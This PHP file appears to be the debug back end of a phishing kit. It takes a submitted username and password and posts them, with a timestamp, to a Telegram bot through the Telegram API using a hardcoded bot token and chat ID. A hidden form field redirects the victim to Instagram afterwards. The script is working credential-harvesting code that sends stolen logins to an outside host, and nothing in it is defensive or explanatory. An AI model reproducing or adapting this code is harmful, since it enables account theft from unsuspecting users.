<?php

// Debug version to see what's happening
header('Content-Type: text/html; charset=utf-8');

echo "<h2>Capture Debug</h2>";
echo "<pre>";

// Telegram credentials
$telegram_bot_token = "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = "8244999766";

echo "Bot Token: " . substr($telegram_bot_token, 0, 20) . "...\n";
echo "Chat ID: {$telegram_chat_id}\n\n";

// Check if POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "✅ POST request received\n\n";
    
    $username = $_POST["username"] ?? '';
    $password = $_POST["password"] ?? '';
    $redirect_url = $_POST["redirect_url"] ?? '';
    
    echo "Username: {$username}\n";
    echo "Password: {$password}\n";
    echo "Redirect: {$redirect_url}\n\n";
    
    if (!empty($username) && !empty($password)) {
        $message = "🔔 *DEBUG TEST*\n\n";
        $message .= "👤 Username: `{$username}`\n";
        $message .= "🔑 Password: `{$password}`\n";
        $message .= "🕐 Time: `" . date("Y-m-d H:i:s") . "`";
        
        $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        $post_data = "chat_id={$telegram_chat_id}&text=" . urlencode($message) . "&parse_mode=Markdown";
        
        echo "Sending to Telegram...\n";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        echo "HTTP Code: {$http_code}\n";
        if ($error) echo "Error: {$error}\n";
        echo "Response:\n{$response}\n";
        
        $result = json_decode($response, true);
        if ($result && $result['ok']) {
            echo "\n✅ SUCCESS! Message sent to Telegram!\n";
        } else {
            echo "\n❌ FAILED to send to Telegram\n";
        }
    } else {
        echo "❌ Username or password is empty\n";
    }
} else {
    echo "❌ Not a POST request\n";
    echo "Method: " . $_SERVER['REQUEST_METHOD'] . "\n";
}

echo "</pre>";

// Show form for testing
?>
<h3>Test Form</h3>
<form method="POST" action="">
    <input type="text" name="username" placeholder="Username" value="testuser"><br>
    <input type="password" name="password" placeholder="Password" value="testpass"><br>
    <input type="hidden" name="redirect_url" value="https://www.instagram.com/">
    <button type="submit">Test Submit</button>
</form>
